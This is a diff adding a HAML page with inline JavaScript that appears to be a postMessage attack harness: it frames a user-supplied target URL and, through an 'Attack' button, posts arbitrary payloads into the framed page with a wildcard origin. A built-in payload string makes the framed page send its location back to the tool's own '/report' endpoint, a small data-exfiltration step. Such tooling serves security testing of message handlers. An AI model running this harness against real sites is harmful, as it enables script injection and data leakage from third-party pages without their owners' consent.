@@ -1,0 +1,62 @@
+.message
+  .alert.alert-info
+.whoami
+  %h3
+    I am the parent. My origin is:
+    %span.origin-hr
+%form.well#target-form
+  .form-group
+    %label{:for => "url-field"} Target
+    %input.form-control#url-field{type: "text", placeholder: "Enter URL to frame"}
+  .form-group
+    %button#load-target Load
+
+%form.well#payload-form
+  .form-group
+    %label{:for => "url-field"} Payload
+    %input.form-control#payload-field{type: "text", placeholder: "Enter payload"}
+    %button#send-payload Attack
+
+%iframe#target{name: "target", style: "width:100%"}
+
+:javascript
+  $('iframe#target').hide();
+  $('.message').hide();
+  var target = '';
+  var locations = [];
+  var index = 0;
+  var payload = "console.log(location.href);z=new window.XMLHttpRequest();console.log(z);z.open('post','"+location.href+"report',true);z.setRequestHeader('Content-type','application/x-www-form-urlencoded');z.send('location='+escape(location));"
+  
+  $(document).ready(function() {
+    $('#payload-form').hide();
+    var loc_elements = location.href.split('/');
+    var origin = loc_elements[0] + "//" + loc_elements[2];
+    $('.origin-hr').text(origin);
+  });
+
+  $('#load-target').click(function(e) {
+    e.preventDefault();
+    var url = $('#url-field').val();
+    loadFrame(url);
+    $('#payload-form').show();
+  });
+
+  $('#send-payload').click(function(e) {
+    var payload = $('#payload-field').val();
+    console.log(payload);
+    e.preventDefault();
+    var frame = window.frames[0];
+    frame.postMessage(payload, '*');
+  });
+
+  $('iframe#target').load(function() {
+    $(this).show();
+  });
+
+  function loadFrame(url) {
+    if (typeof(url) !== "undefined") {
+      $('iframe#target').attr('src', url);
+    } else {
+      $('.alert').text('Fuzzing complete');
+    }
+  }
